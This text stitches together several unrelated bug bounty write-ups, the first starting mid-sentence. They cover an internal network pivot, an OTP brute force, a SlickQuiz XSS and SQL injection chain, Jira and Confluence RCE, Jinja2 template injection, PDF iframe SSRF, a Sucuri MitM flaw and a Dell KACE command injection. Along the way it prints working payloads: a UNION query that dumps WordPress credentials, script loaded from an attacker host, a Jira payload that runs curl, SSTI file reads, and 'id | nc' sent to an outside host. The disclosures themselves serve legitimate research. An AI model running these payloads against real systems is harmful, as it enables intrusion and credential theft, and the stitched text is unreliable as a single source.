entire domain. Finding other hosts Using the information within the zone transfer files, I identified internal hostnames that looked similar to the original host I'd already discovered including: staging.intcorp.jawa.domain.com 10.0.1.1 staging.internal.sith.domain.com 10.0.1.3 internal.vader.domain.com 10.2.1.13 Looks like the sysadmin of this network is a star-wars fan! There were many other hosts that shared the star-wars naming scheme. I decided at this stage it was time to do some port scanning given the host had access to ncat & nmap . I leveraged these to scan the range 10.0.1.0/24 seeking out other interesting hosts. A quick nmap -F 10.0.1.0/24 , brought back some really interesting ports including a machine with what looked to be a tonne of open windows ports: 3389,445,135,137,1433,2433 . Bearing in mind this is an internal network having RDP & SMB open is not unheard of. However as I was limited to what I could use on the box I turned to nmap's scripting engine to see if it would pick up anything. Alas the version of nmap on the compromised box didn't support nmap scripting so that was out :-(. At this stage I decided to alert the company of the issue I'd discovered and asked if I could continue to dig at the machine, I received a very quick reply stating: \"Thanks for alerting us, please see how far you can get in the network, we're fairly sure the network internally is secure\" . Given the 'fairly sure the network internally is secure' statement, I felt I was up for the challenge. Challenge Accepted The next step was seeing if I could traverse the network as I had no hashes or passwords for users. A quick cat of the passwd file showed a user called emperor with an interesting UID .: emperor:x:0:1002:SPalpatine:/home/emperor:/bin/bash Now relating back to the star-wars hostnames, this user also appears to be a star-wars reference, notice the UID appears to be for the root user. However still no password, notice the text between the GID and the home directory... SURELY THAT CAN'T BE THE PASSWORD... At this stage I couldn't believe my luck, root! Now the only natural thing to do was to see if I could log into other machines with the same creds, given there were several hosts on the internal network with SSH open I tried to connect to them with the emperor user. Extra Bonus Of the interesting hosts identified earlier I was able to connect to internal.vader.domain.com with the emperor user who also had root privs on this box too. I was able to dump the hashes from this box and crack them, additionally I discovered the root private key which was used as a master key for signing the VPN certs discovered on the original box. At this stage I wrote up all of my findings and reported to the company under several issues in one report: Remote Code Execution via HTTP Method & Poor Directory Permissions Sensitive Files stored on file system readable by all Password disclosed in /etc/passwd for a root user Weak Hashing algorithm in /etc/shadow Closing Notes Take aways from this, well the single issue here was poor directory permissions and authentication issues allowing me to upload the initial web shell. However what it does outline is that if you persist with something it can reveal some very fruitful findings. Other take-aways from this are sysadmins, be careful with your naming schemes don't make your passwords related to the hostname or users as it can be dangerous. The company have since patched this issue and thanked me for writing up the entire thing for them.

Two-factor authentication (2FA) , sometimes referred to as two-step verification or dual factor authentication, is a security process in which the user provides two different authentication factors to verify themselves to better protect both the user’s credentials and the resources the user can access. Generally, OTP is a combination of 4 digits starting from 0000 to 9999. If we count there 10,000 combinations. In the age of powerful computer 10,000 combinations take only a few minutes to process. If OTP verification is not properly managed, anyone can bypass this with a simple brute force. Why I was able to bypass the 2FA? No rate limiting on an unsuccessful attempt No new OTP policy on X unsuccessful attempt Few prerequisites: Web Browser Burp Suite Now let's see how I was able to bypass the 2FA with burp suite:- Step 01: Logged into the website using the mobile number and entered the wrong OTP to intercept on burp suite Press enter or click to view image in full size Pannel to enter the OTP received on the Mobile Number Press enter or click to view image in full size Intercept the Verify OTP API call on Burp Suite Step 02: Sending the verifyOTP API call to the intruder. Press enter or click to view image in full size Image showing the Dialogue box to send intruder. Press enter or click to view image in full size Intruder Screen Burp Suite Step 03: Selecting the OTP placeholder and add it for simple brute force. Press enter or click to view image in full size Intruder screen with OTP placeholder selected for brute force Step 04: Select the Payload tab, changed the payload type to Numbers and change the payload options as desired and clicked on the attack. Press enter or click to view image in full size Payload Screen: For setting payload desired options Press enter or click to view image in full size Brute Force In Progress Step 05: As the brute force was in progress I could see length for one of the OTP value is changed from 617 to 2250. Lets check: Press enter or click to view image in full size OTP Response Step 06: Boom !!! I was able to get the login token and was able to log in. Press enter or click to view image in full size Details of successful login Hence, The simple brute force was successful.

Here’s the full content:\n\nH1-4420: From Quiz to Admin – Chaining Two 0-Days to Compromise An Uber Wordpress | RCE Security Home About Contact Us Services Research Select Page H1-4420: From Quiz to Admin – Chaining Two 0-Days to Compromise An Uber WordPress by Julien Ahrens | Tuesday, September 10, 2019 | Bug Bounty | 0 comments TL;DR While doing recon for H1-4420, I stumbled upon a WordPress blog that had a plugin enabled called SlickQuiz . Although the latest version 1.3.7.1 was installed and I haven’t found any publicly disclosed vulnerabilities, it still somehow sounded like a bad idea to run a plugin that hasn’t been tested with the last three major versions of WordPress. So I decided to go the very same route as I did already for last year’s H1-3120 which eventually brought me the MVH title: source code review. And it paid off again: This time, I’ve found two vulnerabilities named CVE-2019-12517 (Unauthenticated Stored XSS) and CVE-2019-12516 (Authenticated SQL Injection) which can be chained together to take you from being an unauthenticated WordPress visitor to the admin credentials. Due to the sensitivity of disclosed information I’m using an own temporarily installed WordPress blog throughout this blog article to demonstrate the vulnerabilities and the impact. CVE-2019-12517: Going From Unauthenticated User to Admin via Stored XSS During the source code review, I stumbled upon multiple (obvious) stored XSS vulnerabilities when saving user scores of quizzes. Important side note : It does not matter whether “Save user scores” plugin option is disabled (default) or enabled, the pure presence of a quiz is sufficient for explotiation since this option does only disable/enable the UI elements. The underlying issue is located in php/slickquiz-scores.php in the method generate_score_row() (lines 38-52) where the responses to quizzes are returned without encoding them first: function generate_score_row( $score ) { $scoreRow = ''; $scoreRow .= '<tr>'; $scoreRow .= '<td class=\"table_id\">' . $score->id . '</td>'; $scoreRow .= '<td class=\"table_name\">' . $score->name . '</td>'; $scoreRow .= '<td class=\"table_email\">' . $score->email . '</td>'; $scoreRow .= '<td class=\"table_score\">' . $score->score . '</td>'; $scoreRow .= '<td class=\"table_created\">' . $score->createdDate . '</td>'; $scoreRow .= '<td class=\"table_actions\">' . $this->get_score_actions( $score->id ) . '</td>'; $scoreRow .= '</tr>'; return $scoreRow; } Since $score->name , $score->email and $score->score are use-controllable, a simple request like the following is enough to get three XSS payloads into the SlickQuiz backend: POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 165 DNT: 1 Connection: close action=save_quiz_score&json={\"name\":\"xss<script>alert(1)</script>\",\"email\":\"test@localhost<script>alert(2)</script>\",\"score\":\"<script>alert(3)</script>\",\"quiz_id\":1} As soon as any user with access to the SlickQuiz dashboard visits the user scores, all payloads fire immediately: So far so good. That’s already a pretty good impact, but there must be more. CVE-2019-12516: Authenticated SQL Injections To the Rescue The SlickQuiz plugin is also vulnerable to multiple authenticated SQL Injections almost whenever the id parameter is present in any request. For example the following requests: /wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a) /wp-admin/admin.php?page=slickquiz-edit&id=(select*from(select(sleep(5)))a) /wp-admin/admin.php?page=slickquiz-preview&id=(select*from(select(sleep(5)))a) all cause a 5 second delay: The underlying issue of i.e. the /wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a) vulnerability is located in php/slickquiz-scores.php in the constructor method (line 20) where the GET parameter id is directly supplied to the method get_quiz_by_id() : $quiz = $this->get_quiz_by_id( $_GET['id'] ); Whereof the method get_quiz_by_id() is defined in php/slickquiz-model.php (lines 27-35): function get_quiz_by_id( $id ) { global $wpdb; $db_name = $wpdb->prefix . 'plugin_slickquiz'; $quizResult = $wpdb->get_row( \"SELECT * FROM $db_name WHERE id = $id\" ); return $quizResult; } Another obvious one. Connecting XSS and SQLi for Takeover Now let’s connect both vulnerabilities to get a real WordPress takeover 🙂 First of all: Let’s get the essential login details of the first WordPress user (likely to be the admin): user’s email, login name and hashed password. I’ve built this handy SQLi payload to achieve that: 1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users-- This eventually returns requested data within an <h2> tag: With this payload and a little bit of JavaScript, it’s now possible to exploit the SQLi using a JavaScript XMLHttpRequest : let url = 'http://localhost/wordpress/wp-admin/admin.php?page=slickquiz-scores&id='; let payload = '1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users--' let xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.onreadystatechange = function() { if (xhr.readyState === XMLHttpRequest.DONE) { let result = xhr.responseText.match(/(?:<h2>SlickQuiz Scores for \")(.*)(?:\"<\\/h2>)/); alert(result[1]); } } xhr.open('GET', url + payload, true); xhr.send(); Now changing the XSS payload to: POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 165 DNT: 1 Connection: close action=save_quiz_score&json={\"name\":\"xss\",\"email\":\"test@localhost<script src='http://www.attacker.com/slickquiz.js'>\",\"score\":\"1 / 1\",\"quiz_id\":1}on=save_quiz_score&json={\"name\":\"xss<script>alert(1)</script>\",\"email\":\"test@localhost<script src='http://www.attacker.com/slickquiz.js'>\",\"score\":\"1 / 1\",\"quiz_id\":1} Will cause the XSS to fire and alert the WordPress credentials: From this point on, everything’s possible, just like sending this data cross-domain via another XMLHttpRequest etc. Thanks Uber for the nice bounty!

It was so many interesting results in my work. Seems that it's right time to share my knowledge and experience with you. But first, I wanna inform that two issues in that article well known. And both of that have CVE numbers with patches and software updates. So maybe you will be lucky to find old versions in your testing scope. And I don't want to make hype on that article as Avinash Jain with old Jira vulnerability in Shared filters . From my perspective, it's a shame to make such hype around a bug with a questionable impact which was known for a long time ago. Press enter or click to view image in full size 1. Jira Remote Code Execution in Contact Administrators form ( CVE-2019–11581 ) When it was discovered, I found first that video from Knownsec 404 team But from that time it was no POC for exploitation. But next, I found nice research from ruvlol where he discovered pretty well that the root of the problem in ContactAdministrators!default.jspa form. Also from his article, it was simple to understand that Knownsec 404 team was mistaken in numbers of affected instances. To find all public instances with such functionality you just need to search for : inurl:secure/ContactAdministrators!default.jspa So the exploitation process is very simple. Check from the dashboard page that your Jira instance supports Contact Administrator form. Press enter or click to view image in full size 2. Next, it's better to check the accessibility of that page from URL like: https://jira.example.com/secure/ContactAdministrators!default.jspa 3. Prepare your BurpCollaborator or your server for getting request as POC. I used ngrok tunnel. And fill in the contact form with that payload. $i18n.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’,null).invoke(null,null).exec(‘curl http://your-testing-server.com/rcetest?a=a').waitFor() That payload making just simple curl request to your server. Press enter or click to view image in full size 4. Confirm your results with getting a request from Vulnerable Jira environment. Press enter or click to view image in full size For this issue to be exploitable at least one of the following conditions must be met: an SMTP server has been configured in Jira and the Contact Administrators Form is enabled; or an SMTP server has been configured in Jira and an attacker has “JIRA Administrators” access. So now you know how to make such easy RCE attack in vulnerable Jira environment if your version is still vulnerable. You can check affected versions here . 2. Confluence Remote Code Execution via Widget Connector macro ( CVE-2019–3396 ) That fresh vulnerability came to me with one target where I did a security assessment. And it was some signs that my testing target could be vulnerable due RCE via Widget Connector. With such type of vulnerabilities, it's hard to make good POC. Because of the complexity of that issue. I spent a few time to understand the root of the problem from Knownsec 404 team in their article . And I can say that it's so exciting to understand such research articles and see some results on your environment. So I reproduced all steps on company Confluence. It was a valid issue and the entire server was shut down as vulnerable for mitigation work. Here is my POC: So first it’s an issue with Widget Connector. Which can lead to RCE on the server. Better to check first is your version still vulnerable due to that issue. If yes. Go next. Just find a Youtube video to insert, click Preview, use Burpsuite to capture the package. Press enter or click to view image in full size 2. Try to make such POST request with malicious payload in _template parameter. Also if you don’t have access to your confluence — just try to craft your request from my mock in that article. And don't forget to renew Cookie header. POST /rest/tinymce/1/macro/preview HTTP/1.1 Referer: https://confluence.yourtarget.com/ Content-Type: application/json; charset=utf-8 Cookie: BIGipServerrb-p_cp-confluence_https_pool=!BUsntvn1os/4xuQWbHAsuN+1fsz22TIKPNFouw==;JSESSIONID=E3A43CEFE1932634CD80E301057C379D Accept: */* Accept-Encoding: gzip,deflate Content-Length: 173 Host: confluence.yourtarget.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive {\"contentId\":\"123\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\" https://www.youtube.com/watch?v=1 \",\"width\":\"200\",\"height\":\"200\",\"_template\":\"/WEB-INF/web.xml\"}}} As you see I was requested for /WEB-INF/web.xml . When I was confirmed with the Windows environment on the other side. I was requested for file:///C:/Windows/ directory. And in an embedded object, I found a list of all data inside from the server. Press enter or click to view image in full size And the final step will be to execute the command. But at this point, it was enough to show valid POC for the company where I did a security assessment. As you see both Atlassian RCE is pretty simple to exploit. And all you need now is to have the \"right\" vulnerable version of the Atlassian products ;) PS: Click 👏 “Clapping Hands” icon if you like this article 😉 If you need to auditing, collaboration and testing some projects, please get in touch with me: http://t.me/valyaroller .

Program do not have huge scope , just a single app with lots of features to test. I usually likes this kind of programs as I am not that good with recon . First thought , Lets Find out what technology a website is built with. I use wappalyzer for that. They were using Angular dart , python Django & flask . +.Being a Python developer for last few years , I know where commonly developer makes mistakes . There were one utility named work flow builder . which use to build a financial close process flow. You can automate daily activities with it like sending approval & sending reminder emails. Sending emails functionality caught my attention because most of times this email generator apps are vulnerable to template injection. As this website built with python , i was quite sure that they must be using Jinja2 template. Send email function have 3 fields . To , title & description . I set {{7*7}} as title & description & click on send email button . I got email as “49” as subject & {{7*7}} as description . So the subject field was vulnerable for template injection. Payload : {{7*7}} Press enter or click to view image in full size Payload {{7*7}} basically what this doing is evaluating python code inside curly brackets . I tried another payload to get list of sub classes of object class. Payload : {{ [].__class__.__base__.__subclasses__() }} I got email containing list of sub classes of object class. like below Press enter or click to view image in full size Payload : {{ [].__class__.__base__.__subclasses__() }} Let me explain you this payload , If you are familiar with python , You may know we can create list by using “[]” . You can try this things in python interpreter . Access class of list >>> [].__class__ <type 'list'> #return class of list 2. Access base class of list . >>> [].__class__.__base__ <type 'object'> #return base class of list List is sub class of “object” class. 3.Access sub classes of object class . >>> [].__class__.__base__.__subclasses__() [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>..... So our payload gives us a list of all sub classes “object” class. I reported this issue as it is , hoping I don’t have to go further to prove it’s significant impact. bugcrowd triager reply me with this Press enter or click to view image in full size Ok , so now I have to provide POC to prove impact of this issue to mark it as P1. Most of django apps have config file which contains really sensitive info like AWS keys , API’s & encryption keys. I have path of that config file from my previous findings. So i decided to read that file . To read file in python you have to create object of “file”. We already have list of all sub classes of “Object class”. Lets find index of file class >>> [].__class__.__base__.__subclasses__().index(file) 40 #return index of \"file\" object When you run “ [].__class__.__base__.__subclasses__().index(file) ” this payload in python interpreter you will get index of “file” object. I tried same payload but it gives me nothing , something is wrong . I tried to access other objects but its giving similar error , not returning any value. Press enter or click to view image in full size Next , I decided to directly access file object as we know index of file object in “Object ” sub classes list is “40\". So I tried this payload {{[].__class__.__base__.__subclasses__()[40] }} but got no success, this payload also returning similar result as above image. Payload is breaking somewhere , but not able to find where. After some research , I got on conclusion that may be indexing is block or breaking my payload. If you know little bit of python you may know there are multiple methods to return value in list , one of method is using “pop” function . >>> [1,2,3,4,5].pop(2) 3 Above code returning third value of list & removing it from that list. So now my new payload is {{[].__class__.__base__.__subclasses__().pop(40) }} Above payload gives me object of “file” . Press enter or click to view image in full size Ok, So now I have object of “file” , I can read any file on server . Let’s read “etc/passwd” file . Payload : {{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}. Press enter or click to view image in full size etc/passwd output in email subject Finally , I was able to read files on server. I also able to read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys).

While testing an application I have identified that an application is using the PDFReacter parser. PDFReacter is a formatting processor that parses the HTML content to PDF files.so Since an application has an option to insert data into forms, I started fuzzing with XSS and for that, I simply used <img> tag. there was an option to export the forms to PDF and when I exported the one of the form which has the payload, the final PDF file was like this. Press enter or click to view image in full size This means an application and PDFReacter both do not escapes the HTML tags and processes the HTML tags/XSS Payloads as well. Since I knew that an application is using PDFReacter as a parser and both application and parsers are not escaping my payloads. So the next was with the iframe. I wanted to check if I can load external sites in a final pdf document or not and as you can see that Google is getting loaded in the frame. Press enter or click to view image in full size Now it was clear that I can hit to the external sites by using iframe(SSRF Confirmed). Next step was to read the local files with file:/// wrapper.Simple Payload “><iframe src=”file:///etc/passwd”/></iframe> I used for it. Press enter or click to view image in full size Bang !!!!! Next is to check if the current user has root privileges or not. I Simply tried fetching the shadow file with the below-mentioned payload and I noticed that I was able to fetch the shadow file. “/><iframe src=”file:///etc/shadow”></iframe> Since the Current user has the root privileges, Next was to pop a shell, I Fetched Private SSH keys, And was able to SSH to the server. Press enter or click to view image in full size Although it was not my first RCE, I got goosebumps when I popped the shell. Rahul Maini’s blog helped me a lot to understand the current scenario.

They ran a Bug Bounty program on HackerOne and also blogged about how important security reports are . While their program was still active, I’ve been hacking on them quite a lot which eventually ranked me #1 on their program. By the end of 2017, I have found and reported an explicitly disabled SSL certificate validation in their server-side scanner, which could be used by an attacker with MiTM capabilities to execute arbitrary code on Sucuri’s customer systems. The result: Sucuri provided me with an initial bounty of 250 USD for this issue (they added 500 USD later due to a misunderstanding on their side) – out of an announced 5000 USD max bounty, fixed the issue, closed my report as informative and went completely silent to apparently prevent the disclosure of this issue. Every Sucuri customer who is using the server-side scanner and who installed it on their server before June 2018 should immediately upgrade the server-side scanner to the most recent version which fixes this vulnerability! SSL Certificate Validation is Overrated As part of their services, Sucuri offers a custom server-side scanner , which customers can place on their servers and which runs periodic scans to detect integrity failures / compromises. Basically the server-side scanner is just a custom PHP script with a random looking filename of i.e. sucuri-[md5].php which a customer can place on their webserver. NOTE: Due to a copyright notice in the script itself, I cannot share the full server-side scanner script here, but will use pseudo-code instead to show its logic. If you want to play with it by yourself, register an account with them and grab the script by yourself 😉 <?php $endpoint = \"monitor2\"; $pwd = \"random-md5\"; if(!isset($_GET['run'])) { exit(0); } if(!isset($_POST['secret'])) { exit(0); } $c = curl_init(); curl_setopt($c, CURLOPT_URL, \"https://$endpoint.sucuri.net/imonitor\"); curl_setopt($c, CURLOPT_POSTFIELDS, \"p=$pwd&amp;q=\".$_POST['secret']); curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false); $result = curl_exec($c); $b64 = base64_decode($result); eval($b64); ?> As soon as you put the script in the web root of your server and configure your Sucuri account to perform server-side scans, the script instantly gets hit by the Sucuri Integrity Monitor with an HTTP POST request targeting the run method like the following: This HTTP POST request does also include the secret parameter as shown in the pseudocode above and basically triggers a bunch of IP validations to make sure that only Sucuri is able to trigger the script. Unfortunately this part is flawed as hell due to stuff like: $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'] (But that’s an entirely different topic and not covered by this post.) By the end of the script, a curl request is constructed which eventually triggers a callback to the Sucuri monitoring system. However, there is one strange line in the above code: curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false); So Sucuri explicitly set CURLOPT_SSL_VERIFYPEER to false . The consequences of this are best described by the curl project itself : WARNING: disabling verification of the certificate allows bad guys to man-in-the-middle the communication without you knowing it. Disabling verification makes the communication insecure. Just having encryption on a transfer is not enough as you cannot be sure that you are communicating with the correct end-point. So this is not cool. The issued callback doesn’t contain anything else than the previously mentioned secret and looks like the following: The more interesting part is actually the response to the callback which contains a huge base64 string prefixed by the string WORKED: : After decoding I noticed that it’s simply some PHP code which was generated on the Sucuri infrastructure to do the actual server-side scanning. So essentially a Man-in-the-Middle attacker could simply replace the base64 string with his own PHP code just like c3lzdGVtKCJ0b3VjaCAvdG1wL3JjZSIpOw== which is equal to system(\"touch /tmp/rce\"); : Which finally leads to the execution of the arbitrary code on the customer’s server: How Not to Handle Security Reports This is actually the most interesting part, because communicating with Sucuri was a pain. Since there have been a lot of communication back and forth between me, Sucuri and HackerOne on different ways including the platform and email. The following is a summary of the key events of the communication and should give a good impression about Sucuri’s way to handle security reports. 2017-11-05 I’ve sent the initial report to Sucuri via HackerOne (report #287580) 2017-11-16 Sucuri says that they are aware of the issue but CURLOPT_SSL_VERIFYPEER cannot be enabled due to many hosters not offering the proper libraries and the attack scenario would include an attacker having MiTM on the hoster. MiTM is required – true. But there are many ways to achieve this, and the NSA and Chinese authorities have proven to be capable of such scenarios in the past. And I’m not even talking about sometimes critical compliance requirements such as PCI DSS. 2017-11-17 Sucuri does not think that a MiTM is doable: Think about it, If MITM the way you are describing was doable, you would be able to hijack emails from almost any provider (as SMTP goes unencrypted), redirect traffic by hijacking Google’s 8.8.8.8 DNS and create much bigger issues across the whole internet. Isn’t that exactly the reason why we should use TLS across the world and companies such as Google try to enforce it wherever possible? 2017-11-17 I came up with a bunch of other solutions to tackle the “proper libraries issue”: You could deliver the certificate chain containing only your CA, Intermediates and server certificate via a separate file (or as part of your PHP file) to the customer and do the verification of the server certificate within PHP, i.e. using PHP’s openssl_x509_parse(). You could add a custom method on the customer-side script to verify a signature delivered with the payload sent from monitor2. As soon as the signature does not match, you could easily discard the payload before calling eval(). The signature to be used must be – of course – cryptographically secure by design. You could also encrypt the payload to be sent to the customer site using public-private key crypto on your side and decrypt it using the public key on the client side (rather than encoding it using base64). Should also be doable in pure PHP. 2017-11-29 to 2018-05-16 Sucuri went silent for half a year, where I’ve tried to contact them through HackerOne and directly via email. During that period I’ve also requested mediation through HackerOne. 2018-06-07 Suddenly out of the blue Sucuri told me that they have a fix ready for testing. 2018-06-21 Sucuri rewards the minimum bounty of 250 USD because of: A successful exploitation only works if a malicious actor uses network-level attacks (resulting in MITM) against the hosting server (or any of the intermediary hops to it) to impersonate our API. While in theory possible, this would require a lot of efforts for very little results (in term of the amount of sites affected at once versus the capacity required to conduct the attack). The fact we use anycast also doesn’t guarantee a BGP hijacking attack would be successful. The server-side scanner file contains a unique hash for every single site, which is an information the attacker would also need in order to perform any kind of attack against our customers. 2018-07-18 Sucuri adds an additional 500 USD to the bounty amount because they apparently misunderstood the signature validation point. 2018-09-15 I’ve requested to publicly disclose this issue because it was of so low severity for Sucuri, they shouldn’t have a problem with publicly disclosing this issue. 2018-10-12 A couple of days right before the scheduled disclosure date: Sucuri reopens the report and changes the report status to Informative without any further clarification. No further reply on any channel from Sucuri. That’s where they went silent for the second time. 2018-11-23 I’ve followed up with HackerOne about the whole story and they literally tried everything to resolve this issue by contacting Sucuri directly. HackerOne told me that Sucuri will close their program and the reason for the status change was to address some information which they feel is sensitive. HackerOne closes the program at their request on 2018-12-15. HackerOne even made them aware of different tools to censor the report, but Sucuri did not react anymore (again). 2019-01-02 Agreed with HackerOne about taking the last resort disclosure option, and giving Sucuri another 180 days of additional time to respond. They never responded. 2019-06-13 to 2019-06-19 I’ve sent a couple of more emails directly to Sucuri (where they used to respond to) to make them aware of this blog post, but again: no answer at all. 2019-06-20 Public disclosure in the interest of the general public according to HackerOne’s last resort option. About HackerOne’s Last Resort Option I have tried to disclose this issue several times through HackerOne, but unfortunately Sucuri wasn’t willing to provide any disclosure timeline (have you read the mentioned blog article?) – in fact they did not even respond anymore in the end (not even via email) – which is why I took the last resort option after consulting with HackerOne and as per their guidelines : If 180 days have elapsed with the Security Team being unable or unwilling to provide a vulnerability disclosure timeline, the contents of the Report may be publicly disclosed by the Finder. We believe transparency is in the public’s best interest in these extreme cases. Since this is about an RCE affecting potentially all of Sucuri’s customers who are using the server-side security scanner, and since there was no public or customer statement by Sucuri (at least that I am aware of) I think the general public deserves to know about this flaw.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDell KACE K1000 Remote Code Execution – the Story of Bug K1-18652 | RCE Security Home About Contact Us Services Research Select Page Dell KACE K1000 Remote Code Execution – the Story of Bug K1-18652 by Julien Ahrens | Tuesday, April 9, 2019 | Advisory , Bug Bounty | 0 comments This is the story of an unauthenticated RCE affecting one of Dropbox’s in scope vendors during last year’s H1-3120 event. It’s one of my more recon-intensive, yet simple, vulnerabilities, and it (probably) helped me to become MVH by the end of the day ;-). TL;DR It’s all about an undisclosed but fixed bug in the KACE Systems Management Appliance internally tracked by the ID K1-18652 which allows an unauthenticated attacker to execute arbitrary code on the appliance. Since the main purpose of the appliance is to manage client endpoints – and you are able to deploy software packages to clients – I theoretically achieved RCE on all of the vendor’s clients. It turns out that Dell (the software is now maintained by Quest) have silently fixed this vulnerability with the release of version 6.4 SP3 (6.4.120822). Recon is Key! While doing recon for the in-scope assets during H1-3120, I came across an administrative panel of what looked like being a Dell Kace K1000 Administrator Interface: While gathering some background information about this “Dell Kace K1000” system, I came across the very same software now being distributed by a company called “ Quest Software Inc “, which was previously owned by Dell. Interestingly, Quest does also offer a free trial of the KACE® Systems Management Appliance appliance. Unfortunately, the free trial only covers the latest version of the appliance (this is at the time of this post v9.0.270), which also looks completely different: However, the version I’ve found on the target was 6.3.113397 according to the very chatty web application: X-DellKACE-Appliance: k1000 X-DellKACE-Host: redacted.com X-DellKACE-Version: 6.3.113397 X-KBOX-WebServer: redacted.com X-KBOX-Version: 6.3.113397 So there are at least 3 major versions between what I’ve found and what the current version is. Even trying to social engineer the Quest support to provide me with an older version did not work – apparently, I’m not a good social engineer 😉 Recon is Key!! At first I thought that both versions aren’t comparable at all, because codebases usually change heavily between multiple major versions, but I still decided to give it a try. I’ve set up a local testing environment with the latest version to poke around with it and understand what it is about. TBH at that point, I had very small expectations to find anything in the new version that can be applied to the old version. Apparently, I was wrong. Recon is Key !!!11 While having a look at the source code of the appliance, I’ve stumbled upon a naughty little file called /service/krashrpt.php which is reachable without any authentication and which sole purpose is to handle crash dump files. When reviewing the source code, I’ve found a quite interesting reference to a bug called K1-18652 , which apparently was filed to prevent a path traversal issue through the parameters kuid and name ( $values is basically a reference to all parameters supplied either via GET or POST): try { // K1-18652 make sure we escape names so we don't get extra path characters to do path traversal $kuid = basename($values['kuid']); $name = basename($values['name']); } catch( Exception $e ) { KBLog( \"Missing URL param: \" . $e->getMessage() ); exit(); } Later kuid and name are used to construct a zip file name: $tmpFnBase = \"krash_{$name}_{$kuid}\"; $tmpDir = tempnam( KB_UPLOAD_DIR, $tmpFnBase ); unlink( $tmpDir ); $zipFn = $tmpDir . \".zip\"; However, K1-18652 does not only introduce the basename call to prevent the path traversal, but also two escapeshellarg calls to prevent any arbitrary command injection through the $tmpDir and $zipFn strings: // unzip the archive to a tmpDir, and delete the .zip file // K1-18652 Escape the shell arguments to avoid remote execution from inputs exec( \"/usr/local/bin/unzip -d \" . escapeshellarg($tmpDir) . \" \" . escapeshellarg($zipFn)); unlink( $zipFn ); Although escapeshellarg does not fully prevent command injections I haven’t found any working way to exploit it on the most recent version of K1000. Using a new K1000 to exploit an old K1000 So K1-18652 addresses two potentially severe issues which have been fixed in the recent version. Out of pure curiosity, I decided to blindly try a common RCE payload against the old K1000 version assuming that the escapeshellarg calls haven’t been implemented for the kuid and name parameters in the older version at all: POST /service/krashrpt.php HTTP/1.1 Host: redacted.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: kboxid=r8cnb8r3otq27vd14j7e0ahj24 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 37 kuid=id | nc www.rcesecurity.com 53 And guess what happened: Awesome! This could afterwards be used to execute arbitrary code on all connected client systems because K1000 is an asset management system: The KACE Systems Management Appliance (SMA) helps you accomplish these goals by automating complex administrative tasks and modernizing your unified endpoint management approach. This makes it possible for you to inventory all hardware and software, patch mission-critical applications and OS, reduce the risk of breach, and assure software license compliance. So you’re able to reduce systems management complexity and safeguard your vulnerable endpoints. Source: Quest Comment from the Vendor Unfortunately, since I haven’t found any public references to the bug, the fix or an existing exploit, I’ve contacted Quest to get more details about the vulnerability and their security coordination process. Quest later told me that the fix was shipped by Dell with version 6.4 SP3 (6.4.120822), but that neither a public advisory has been published nor an explicit customer statement was made – so in other words: it was silently fixed. BugBountyTip If you find a random software in use, consider investing the time to set up an instance of the software locally and try to understand how it works and search for bugs. This works for me every, single time. Thanks, Dropbox for the nice bounty! X RSS Designed by Elegant Themes | Powered by WordPress"}

